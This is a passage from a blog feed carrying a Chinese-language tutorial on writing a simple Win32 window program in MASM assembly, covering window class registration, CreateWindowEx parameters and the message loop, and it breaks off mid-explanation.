      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(3)：简单的窗口</title>
    <link href="http://hacktech.cn/2018/02/06/Win32%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-3-%EF%BC%9A%E7%AE%80%E5%8D%95%E7%9A%84%E7%AA%97%E5%8F%A3.html"/>
    <id>http://hacktech.cn/2018/02/06/Win32汇编学习-3-：简单的窗口.html</id>
    <published>2018-02-06T13:12:50.000Z</published>
    <updated>2018-09-07T08:34:33.085Z</updated>
    
    <content type="html"><![CDATA[<p>这次我们将写一个 Windows 程序，它会在桌面显示一个标准的窗口，以此根据代码来学习如何创建一个简单的窗口。<br><a id="more"></a></p><h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>Windows 程序中，在写图形用户界面时需要调用大量的标准 Windows Gui 函数。其实这对用户和程序员来说都有好处，对于用户，面对的是同一套标准的窗口，对这些窗口的操作都是一样的，所以使用不同的应用程序时无须重新学习操作。对程序员来说，这些 Gui 源代码都是经过了微软的严格测试，随时拿来就可以用的。当然至于具体地写程序对于程序员来说还是有难度的。为了创建基于窗口的应用程序，必须严格遵守规范。做到这一点并不难，只要用模块化或面向对象的编程方法即可。</p><p>下面我就列出在桌面显示一个窗口的几个步骤：</p><ol><li>得到您应用程序的句柄(必需)； </li><li>得到命令行参数(如果您想从命令行得到参数，可选)； </li><li>注册窗口类(必需，除非您使用 Windows 预定义的窗口类，如 MessageBox 或 dialog box； </li><li>产生窗口(必需)； </li><li>在桌面显示窗口(必需，除非您不想立即显示它)； </li><li>刷新窗口客户区； </li><li>进入无限的获取窗口消息的循环； </li><li>如果有消息到达，由负责该窗口的窗口回调函数处理； </li><li>如果用户关闭窗口，进行退出处理。 </li></ol><p>相对于单用户的 DOS 下的编程来说，Windows 下的程序框架结构是相当复杂的。但是 Windows 和 DOS 在系统架构上是截然不同的。Windows 是一个多任务的操作系统，故系统中同时有多个应用程序彼此协同运行。这就要求 Windows 程序员必须严格遵守编程规范，并养成良好的编程风格。</p><h2 id="内容："><a href="#内容：" class="headerlink" title="内容："></a>内容：</h2><p>下面是我们简单的窗口程序的源代码。在进入复杂的代码前，指出几点要点：</p><ul><li>您应当把程序中要用到的所有常量和结构体的声明放到一个头文件中，并且在源程序的开始处包含这个头文件。这么做将会节省您大量的时间，也免得一次又一次的敲键盘。目前，我所使用的是<a href="http://masm32.com/" target="_blank" rel="noopener">masm32.com</a>提供的。您也可以定义您自己的常量和结构体，但最好把它们放到独立的头文件中 </li><li>用 includelib 指令，包含您的程序要引用的库文件，譬如：若您的程序要调用 “MessageBox”， 您就应当在源文件中加入如下一行： includelib user32.lib 这条语句告诉 MASM 您的程序将要用到一些引入库。如果您不止引用一个库，只要简单地加入 includelib 语句，不要担心链接器如何处理这么多的库，只要在链接时用链接开关 /LIBPATH 指明库所在的路径即可。 </li><li>在其它地方运用头文件中定义函数原型，常数和结构体时，要严格保持和头文件中的定义一致，包括大小写。在查询函数定义时，这将节约您大量的时间； </li><li>在编译，链接时用makefile文件，免去重复敲键。 </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">option casemap:none </span><br><span class="line">include windows.inc </span><br><span class="line">include user32.inc </span><br><span class="line">includelib user32.lib            ; calls to functions in user32.lib and kernel32.lib </span><br><span class="line">include kernel32.inc </span><br><span class="line">includelib kernel32.lib </span><br><span class="line"></span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD </span><br><span class="line"></span><br><span class="line">.DATA                     ; initialized data </span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;,0        ; the name of our window class </span><br><span class="line">AppName db &quot;Our First Window&quot;,0        ; the name of our window </span><br><span class="line"></span><br><span class="line">.DATA?                ; Uninitialized data </span><br><span class="line">hInstance HINSTANCE ?        ; Instance handle of our program </span><br><span class="line">CommandLine LPSTR ? </span><br><span class="line">.CODE                ; Here begins our code </span><br><span class="line">start: </span><br><span class="line">invoke GetModuleHandle, NULL            ; get the instance handle of our program. </span><br><span class="line">                                                                       ; Under Win32, hmodule==hinstance mov hInstance,eax </span><br><span class="line">mov hInstance,eax </span><br><span class="line">invoke GetCommandLine                        ; get the command line. You don&apos;t have to call this function IF </span><br><span class="line">                                                                       ; your program doesn&apos;t process the command line. </span><br><span class="line">mov CommandLine,eax </span><br><span class="line">invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT        ; call the main function </span><br><span class="line">invoke ExitProcess, eax                           ; quit our program. The exit code is returned in eax from WinMain. </span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD </span><br><span class="line">    LOCAL wc:WNDCLASSEX                                            ; create local variables on stack </span><br><span class="line">    LOCAL msg:MSG </span><br><span class="line">    LOCAL hwnd:HWND </span><br><span class="line"></span><br><span class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX                   ; fill values in members of wc </span><br><span class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </span><br><span class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </span><br><span class="line">    mov   wc.cbClsExtra,NULL </span><br><span class="line">    mov   wc.cbWndExtra,NULL </span><br><span class="line">    push  hInstance </span><br><span class="line">    pop   wc.hInstance </span><br><span class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </span><br><span class="line">    mov   wc.lpszMenuName,NULL </span><br><span class="line">    mov   wc.lpszClassName,OFFSET ClassName </span><br><span class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </span><br><span class="line">    mov   wc.hIcon,eax </span><br><span class="line">    mov   wc.hIconSm,eax </span><br><span class="line">    invoke LoadCursor,NULL,IDC_ARROW </span><br><span class="line">    mov   wc.hCursor,eax </span><br><span class="line">    invoke RegisterClassEx, addr wc                       ; register our window class </span><br><span class="line">    invoke CreateWindowEx,NULL,\ </span><br><span class="line">                ADDR ClassName,\ </span><br><span class="line">                ADDR AppName,\ </span><br><span class="line">                WS_OVERLAPPEDWINDOW,\ </span><br><span class="line">                CW_USEDEFAULT,\ </span><br><span class="line">                CW_USEDEFAULT,\ </span><br><span class="line">                CW_USEDEFAULT,\ </span><br><span class="line">                CW_USEDEFAULT,\ </span><br><span class="line">                NULL,\ </span><br><span class="line">                NULL,\ </span><br><span class="line">                hInst,\ </span><br><span class="line">                NULL </span><br><span class="line">    mov   hwnd,eax </span><br><span class="line">    invoke ShowWindow, hwnd,CmdShow               ; display our window on desktop </span><br><span class="line">    invoke UpdateWindow, hwnd                                 ; refresh the client area </span><br><span class="line"></span><br><span class="line">    .WHILE TRUE                                                         ; Enter message loop </span><br><span class="line">                invoke GetMessage, ADDR msg,NULL,0,0 </span><br><span class="line">                .BREAK .IF (!eax) </span><br><span class="line">                invoke TranslateMessage, ADDR msg </span><br><span class="line">                invoke DispatchMessage, ADDR msg </span><br><span class="line">   .ENDW </span><br><span class="line">    mov     eax,msg.wParam                                            ; return exit code in eax </span><br><span class="line">    ret </span><br><span class="line">WinMain endp </span><br><span class="line"></span><br><span class="line">WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM </span><br><span class="line">    .IF uMsg==WM_DESTROY                           ; if the user closes our window </span><br><span class="line">        invoke PostQuitMessage,NULL             ; quit our application </span><br><span class="line">    .ELSE </span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam     ; Default message processing </span><br><span class="line">        ret </span><br><span class="line">    .ENDIF </span><br><span class="line">    xor eax,eax </span><br><span class="line">    ret </span><br><span class="line">WndProc endp </span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>看到一个简单的 Windows 程序有这么多行，您是不是有点想死? 但是您必须要知道的是上面的大多数代码都是模板而已，模板的意思即是指这些代码对差不多所有标准 Windows 程序来说都是相同的。在写 Windows 程序时您可以把这些代码拷来拷去，当然把这些重复的代码写到一个库中也挺好。其实真正要写的代码集中在 WinMain 中。这和一些 C 编译器一样，无须要关心其它杂务，集中精力于 WinMain 函数。<strong>唯一不同的是 C 编译器要求您的源代码有必须有一个函数叫 WinMain。否则 C 无法知道将哪个函数和有关的前后代码链接。相对C，汇编语言提供了较大的灵活性，它不强行要求一个叫 WinMain 的函数。</strong></p><p>做好心理准备，下面我们开始分析代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat，stdcall</span><br><span class="line">option casemap：none</span><br><span class="line"></span><br><span class="line">WinMain proto ：DWORD，：DWORD，：DWORD，：DWORD</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">include kernel32.inc</span><br><span class="line">includelib user32.lib</span><br><span class="line">includelib kernel32.lib</span><br></pre></td></tr></table></figure><p>您可以把前三行看成是”必须”的.</p><p><code>.386</code>告诉MASN我们要用80386指令集。<br><code>. model flat，stdcall</code>告诉MASM 我们用的内存寻址模式，此处也可以加入stdcall告诉MASM我们所用的参数传递约定。  </p><p>接下来是函数 WinMain 的原型声明，因为我们稍后要用到该函数，故必须先声明。我们必须包含 window.inc 文件，因为其中包含大量要用到的常量和结构的定义，该文件是一个文本文件，您可以用任何文本编辑器打开并且查看它</p><p>我们的程序调用 user32.dll (譬如：CreateWindowEx， RegisterWindowClassEx) 和 kernel32.dll (ExitProcess)中的函数，所以必须链接这两个库。接下来我如果问：您需要把什么库链入您的程序呢 ? 答案是：先查到您要调用的函数在什么库中，然后包含进来。譬如：若您要调用的函数在 gdi32.dll 中，您就要包含gdi32.inc头文件。和 MASM 相比，TASM 则要简单得多，您只要引入一个库，即：import32.lib。&lt;但 Tasm5 麻烦的是 windows.inc 非常的不全面，而且如果在 Windows.inc 中包含全部的 API 定义会内存不够，所以每次你得把用到的 API 定义拷贝出来&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.DATA</span><br><span class="line"></span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;，0 </span><br><span class="line">AppName db &quot;Our First Window&quot;，0</span><br><span class="line"></span><br><span class="line">.DATA?</span><br><span class="line"></span><br><span class="line">hInstance HINSTANCE ?</span><br><span class="line">CommandLine LPSTR ?</span><br></pre></td></tr></table></figure><p>接下来是<code>DATA</code>“分段”。 在 .DATA 中我们定义了两个以 NULL 结尾的字符串 (ASCIIZ)：其中 ClassName 是 Windows 类名，AppName 是我们窗口的名字。这两个变量都是初始化了的。未进行初始化的两个变量放在 <code>.DATA?</code> “分段”中，其中 hInstance 代表应用程序的句柄，CommandLine 保存从命令行传入的参数。HINSTACE 和 LPSTR 是两个数据类型名，它们在头文件中定义，可以看做是 DWORD 的别名，之所以要这么重新定仅是为了易记。您可以查看 windows.inc 文件，在 .DATA? 中的变量都是未经初始化的，这也就是说在程序刚启动时它们的值是什么无关紧要，只不过占有了一块内存，以后可以再利用而已。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.CODE</span><br><span class="line">start：</span><br><span class="line">invoke GetModuleHandle， NULL</span><br><span class="line">mov hInstance，eax</span><br><span class="line">invoke GetCommandLine</span><br><span class="line">mov CommandLine，eax</span><br><span class="line">invoke WinMain， hInstance，NULL，CommandLine， SW_SHOWDEFAULT</span><br><span class="line">invoke ExitProcess，eax</span><br><span class="line">.....</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><code>.CODE</code> “分段”包含了您应用程序的所有代码，这些代码必须都在 .code 和 end 之间。至于 label 的命名只要遵从 Windows 规范而且保证唯一则具体叫什么倒是无所谓。我们程序的第一条语句是调用 GetModuleHandle 去查找我们应用程序的句柄。在Win32下，应用程序的句柄和模块的句柄是一样的。您可以把实例句柄看成是您的应用程序的 ID 号。我们在调用几个函数是都把它作为参数来进行传递，所以在一开始便得到并保存它就可以省许多的事。</p><p>特别注意：WIN32下的实例句柄实际上是您应用程序在内存中的线性地址。</p><p><strong>WIN32 中函数的函数如果有返回值，那它是通过 eax 寄存器来传递的。其他的值可以通过传递进来的参数地址进行返回。</strong>一个 WIN32 函数被调用时总会保存好段寄存器和 ebx，edi，esi和ebp 寄存器，而 ecx和edx 中的值总是不定的，不能在返回时应用。特别注意：从 Windows API 函数中返回后，eax，ecx，edx 中的值和调用前不一定相同。当函数返回时，返回值放在eax中。如果您应用程序中的函数提供给 Windows 调用时，也必须遵守这一点，即在函数入口处保存段寄存器和 ebx，esp，esi，edi 的值并在函数返回时恢复。如果不这样一来的话，您的应用程序很快会崩溃。从您的程序中提供给 Windows 调用的函数大体上有两种：Windows 窗口过程和 Callback 函数。</p><p>如果您的应用程序不处理命令行那么就无须调用 GetCommandLine，这里只是告诉您如果要调用应该怎么做。 </p><p>下面则是调用WinMain了。该函数共有4个参数：应用程序的实例句柄，该应用程序的前一实例句柄，命令行参数串指针和窗口如何显示。Win32 没有前一实例句柄的概念，所以第二个参数总为0。之所以保留它是为了和 Win16 兼容的考虑，在 Win16下，如果 hPrevInst 是 NULL，则该函数是第一次运行。特别注意：您不用必须声明一个名为 WinMain 函数，事实上在这方面您可以完全作主，您甚至无须有一个和 WinMain 等同的函数。您只要把 WinMain 中的代码拷到GetCommandLine 之后，其所实现的功能完全相同。在 WinMain 返回时，把返回码放到 eax 中。然后在应用程序结束时通过 ExitProcess 函数把该返回码传递给 Windows 。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WinMain proc Inst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD</span><br></pre></td></tr></table></figure><p>上面是WinMain的定义。注意跟在 proc 指令后的parameter：type形式的参数，它们是由调用者传给 WinMain 的，我们引用是直接用参数名即可。至于压栈和退栈时的平衡堆栈工作由 MASM 在编译时加入相关的前序和后序汇编指令来进行。 <code>LOCAL wc：WNDCLASSEX LOCAL msg：MSG LOCAL hwnd：HWND LOCAL</code> 伪指令为局部变量在栈中分配内存空间，所有的 LOCAL 指令必须紧跟在 PROC 之后。LOCAL 后跟声明的变量，其形式是 变量名:变量类型。譬如 <code>LOCAL wc：WNDCLASSEX</code> 即是告诉 MASM 为名字叫 wc 的局部边量在栈中分配长度为 WNDCLASSEX 结构体长度的内存空间，然后我们在用该局部变量是无须考虑堆栈的问题，考虑到 DOS 下的汇编，这不能不说是一种恩赐。不过这就要求这样声明的局部变量在函数结束时释放栈空间，(也即不能在函数体外被引用)，另一个缺点是您因不能初始化您的局部变量，不得不在稍后另外再对其赋值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mov wc.cbSize，SIZEOF WNDCLASSEX</span><br><span class="line">mov wc.style， CS_HREDRAW or CS_VREDRAW</span><br><span class="line">mov wc.lpfnWndProc， OFFSET WndProc</span><br><span class="line">mov wc.cbClsExtra，NULL</span><br><span class="line">mov wc.cbWndExtra，NULL</span><br><span class="line">push hInstance</span><br><span class="line">pop wc.hInstance</span><br><span class="line">mov wc.hbrBackground，COLOR_WINDOW+1 </span><br><span class="line">mov wc.lpszMenuName，NULL</span><br><span class="line">mov wc.lpszClassName，OFFSET ClassName </span><br><span class="line">invoke LoadIcon，NULL，IDI_APPLICATION</span><br><span class="line">mov wc.hIcon，eax</span><br><span class="line">mov wc.hIconSm，eax</span><br><span class="line">invoke LoadCursor，NULL，IDC_ARROW</span><br><span class="line">mov wc.hCursor，eax invoke </span><br><span class="line">RegisterClassEx， addr w</span><br></pre></td></tr></table></figure><p>上面几行从概念上说确实是非常地简单。只要几行指令就可以实现。其中的主要概念就是窗口类（window class），一个窗口类就是一个有关窗口的规范，这个规范定义了几个主要的窗口的元素，如：图标、光标、背景色、和负责处理该窗口的函数。您产生一个窗口时就必须要有这样的一个窗口类。如果您要产生不止一个同种类型的窗口时，最好的方法就是把这个窗口类存储起来，这种方法可以节约许多的内存空间。也许今天您不会太感觉到，可是想想以前 PC 大多数只有 1M 内存时，这么做是非常有必要的。如果您要定义自己的创建窗口类就必须：在一个 WINDCLASS 或 WINDOWCLASSEXE 结构体中指明您窗口的组成元素，然后调用 RegisterClass 或 RegisterClassEx ，再根据该窗口类产生窗口。对不同特色的窗口必须定义不同的窗口类。 WINDOWS有几个预定义的窗口类，譬如：按钮、编辑框等。要产生该种风格的窗口无须预先再定义窗口类了，只要包预定义类的类名作为参数调用 CreateWindowEx 即可。</p><p>WNDCLASSEX 中最重要的成员莫过于lpfnWndProc了。前缀 lpfn 表示该成员是一个指向函数的长指针。在 Win32中由于内存模式是 FLAT 型，所以没有 near 或 far 的区别。每一个窗口类必须有一个窗口过程，当 Windows 把属于特定窗口的消息发送给该窗口时，该窗口的窗口类负责处理所有的消息，如键盘消息或鼠标消息。由于窗口过程差不多智能地处理了所有的窗口消息循环，所以您只要在其中加入消息处理过程即可。下面我将要讲解 WNDCLASSEX 的每一个成员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">WNDCLASSEX STRUCT DWORD </span><br><span class="line">  cbSize            DWORD      ? </span><br><span class="line">  style             DWORD      ? </span><br><span class="line">  lpfnWndProc       DWORD      ? </span><br><span class="line">  cbClsExtra        DWORD      ? </span><br><span class="line">  cbWndExtra        DWORD      ? </span><br><span class="line">  hInstance         DWORD      ? </span><br><span class="line">  hIcon             DWORD      ? </span><br><span class="line">  hCursor           DWORD      ? </span><br><span class="line">  hbrBackground     DWORD      ? </span><br><span class="line">  lpszMenuName      DWORD      ? </span><br><span class="line">  lpszClassName     DWORD      ? </span><br><span class="line">  hIconSm           DWORD      ? </span><br><span class="line">WNDCLASSEX ENDS</span><br></pre></td></tr></table></figure><ul><li><code>cbSize</code>：WNDCLASSEX 的大小。我们可以用sizeof（WNDCLASSEX）来获得准确的值。 </li><li><code>style</code>：从这个窗口类派生的窗口具有的风格。您可以用“or”操作符来把几个风格或到一起。 </li><li><code>lpfnWndProc</code>：窗口处理函数的指针。 </li><li><code>cbClsExtra</code>：指定紧跟在窗口类结构后的附加字节数。 </li><li><code>cbWndExtra</code>：指定紧跟在窗口事例后的附加字节数。如果一个应用程序在资源中用CLASS伪指令注册一个对话框类时，则必须把这个成员设成DLGWINDOWEXTRA。 </li><li><code>hInstance</code>：本模块的事例句柄。 </li><li><code>hIcon</code>：图标的句柄。 </li><li><code>hCursor</code>：光标的句柄。 </li><li><code>hbrBackground</code>：背景画刷的句柄。 </li><li><code>lpszMenuName</code>：指向菜单的指针。 </li><li><code>lpszClassName</code>：指向类名称的指针。 </li><li><code>hIconSm</code>：和窗口类关联的小图标。如果该值为NULL。则把hCursor中的图标转换成大小合适的小图标。 </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">invoke CreateWindowEx， NULL，\</span><br><span class="line">ADDR ClassName，\</span><br><span class="line">ADDR AppName，\</span><br><span class="line">WS_OVERLAPPEDWINDOW，\</span><br><span class="line">CW_USEDEFAULT，\</span><br><span class="line">CW_USEDEFAULT，\</span><br><span class="line">CW_USEDEFAULT，\</span><br><span class="line">CW_USEDEFAULT，\ </span><br><span class="line">NULL，\ </span><br><span class="line">NULL，\</span><br><span class="line">hInst，\</span><br><span class="line">NULL</span><br></pre></td></tr></table></figure><p>注册窗口类后，我们将调用<code>CreateWindowEx</code>来产生实际的窗口。请注意该函数有12个参数。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CreateWindowExA proto dwExStyle：DWORD，\</span><br><span class="line">lpClassName：DWORD，\</span><br><span class="line">lpWindowName：DWORD，\ </span><br><span class="line">dwStyle：DWORD，\</span><br><span class="line">X：DWORD，\</span><br><span class="line">Y：DWORD，\</span><br><span class="line">nWidth：DWORD，\</span><br><span class="line">nHeight：DWORD，\</span><br><span class="line">hWndParent：DWORD ，\</span><br><span class="line">hMenu：DWORD，\ </span><br><span class="line">hInstance：DWORD，\</span><br><span class="line">lpParam：DWORD</span><br></pre></td></tr></table></figure><p>我们来仔细看一看这些的参数：</p><ul><li><code>dwExStyle</code>：附加的窗口风格。相对于旧的CreateWindow这是一个新的参数。在9X/NT中您可以使用新的窗口风格。您可以在Style中指定一般的窗口风格，但是一些特殊的窗口风格，如顶层窗口则必须在此参数中指定。如果您不想指定任何特别的风格，则把此参数设为NULL。 </li><li><code>lpClassName</code>：（必须）。ASCIIZ形式的窗口类名称的地址。可以是您自定义的类，也可以是预定义的类名。像上面所说，每一个应用程序必须有一个窗口类。 </li><li><code>lpWindowName</code>：ASCIIZ形式的窗口名称的地址。该名称会显示在标题条上。如果该参数空白，则标题条上什么都没有。 </li><li><code>dwStyle</code>：窗口的风格。在此您可以指定窗口的外观。可以指定该参数为零，但那样该窗口就没有系统菜单，也没有最大化和最小化按钮，也没有关闭按钮，那样您不得不按Alt+F4 来关闭它。最为普遍的窗口类风格是 <code>WS_OVERLAPPEDWINDOW</code>。 一种窗口风格是一种按位的掩码，这样您可以用<code>or</code>把您希望的窗口风格或起来。像 <code>WS_OVERLAPPEDWINDOW</code> 就是由几种最为普遍的风格<code>or</code>起来的。 </li><li><code>X</code>，<code>Y</code>： 指定窗口左上角的以像素为单位的屏幕坐标位置。缺省地可指定为 <code>CW_USEDEFAULT</code>，这样 Windows 会自动为窗口指定最合适的位置。 </li><li><code>nWidth</code>，<code>nHeight</code>： 以像素为单位的窗口大小。缺省地可指定为 <code>CW_USEDEFAULT</code>，这样 Windows 会自动为窗口指定最合适的大小。 </li><li><code>hWndParent</code>： 父窗口的句柄（如果有的话）。这个参数告诉 Windows 这是一个子窗口和他的父窗口是谁。这和 MDI（多文档结构）不同，此处的子窗口并不会局限在父窗口的客户区内。他只是用来告诉 Windows 各个窗口之间的父子关系，以便在父窗口销毁是一同把其子窗口销毁。在我们的例子程序中因为只有一个窗口，故把该参数设为 NULL。 </li><li><code>hMenu</code>： WINDOWS菜单的句柄。如果只用系统菜单则指定该参数为NULL。回头看一看<code>WNDCLASSEX</code> 结构中的 <code>lpszMenuName</code> 参数，它也指定一个菜单，这是一个缺省菜单，任何从该窗口类派生的窗口若想用其他的菜单需在该参数中重新指定。其实该参数有双重意义：一方面若这是一个自定义窗口时该参数代表菜单句柄，另一方面，若这是一个预定义窗口时，该参数代表是该窗口的 ID 号。Windows 是根据<code>lpClassName</code> 参数来区分是自定义窗口还是预定义窗口的。 </li><li><code>hInstance</code>： 产生该窗口的应用程序的实例句柄。 </li><li><code>lpParam</code>： （可选）指向欲传给窗口的结构体数据类型参数的指针。如在MDI中在产生窗口时传递 CLIENTCREATESTRUCT 结构的参数。一般情况下，该值总为零，这表示没有参数传递给窗口。可以通过GetWindowLong 函数检索该值。 </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov hwnd，eax</span><br><span class="line">invoke ShowWindow， hwnd，CmdShow</span><br><span class="line">invoke UpdateWindow， hwnd</span><br></pre></td></tr></table></figure><p>调用<code>CreateWindowEx</code>成功后，窗口句柄在eax中。我们必须保存该值以备后用。我们刚刚产生的窗口不会自动显示，所以必须调用 <code>ShowWindow</code> 来按照我们希望的方式来显示该窗口。接下来调用 <code>UpdateWindow</code> 来更新客户区。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.WHILE TRUE</span><br><span class="line">invoke GetMessage， ADDR msg，NULL，0，0</span><br><span class="line">.BREAK .IF (!eax)</span><br><span class="line">invoke TranslateMessage， ADDR msg </span><br><span class="line">invoke DispatchMessage， ADDR msg</span><br><span class="line">.ENDW</span><br></pre></td></tr></table></figure><p>这时候我们的窗口已显示在屏幕上了。但是它还不能从外界接收消息。所以我们必须给它提供相关的消息。我们是通过一个<strong>消息循环</strong>来完成该项工作的。每一个模块仅有一个消息循环，我们不断地调用 <code>GetMessage</code> 从 Windows 中获得消息。<code>GetMessage</code> 传递一个 MSG 结构体给 Windows ，然后 Windows 在该函数中填充有关的消息，一直到 Windows 找到并填充好消息后 <code>GetMessage</code> 才会返回。在这段时间内系统控制权可能会转移给其他的应用程序。这样就构成了Windows 下的多任务结构。如果 <code>GetMessage</code> 接收到 <code>WM_QUIT</code> 消息后就会返回 <code>FALSE</code>，使循环结束并退出应用程序。<code>TranslateMessage</code> 函数是一个是实用函数，它从键盘接受原始按键消息，然后解释成 <code>WM_CHAR</code>，再把 <code>WM_CHAR</code> 放入消息队列，由于经过解释后的消息中含有按键的 ASCII 码，这比原始的扫描码好理解得多。<strong>如果您的应用程序不处理按键消息的话，可以不调用该函数。</strong><code>DispatchMessage</code> 会把消息发送给负责该窗口过程的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax，msg.wParam</span><br><span class="line">ret</span><br><span class="line">WinMain endp</span><br></pre></td></tr></table></figure><p>如果消息循环结束了，退出码存放在 MSG 中的 wParam中，您可以通过把它放到 eax 寄存器中传给 Windows，目前 Windows 没有利用到这个结束码，但我们最好还是遵从 Windows 规范已防意外。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WndProc 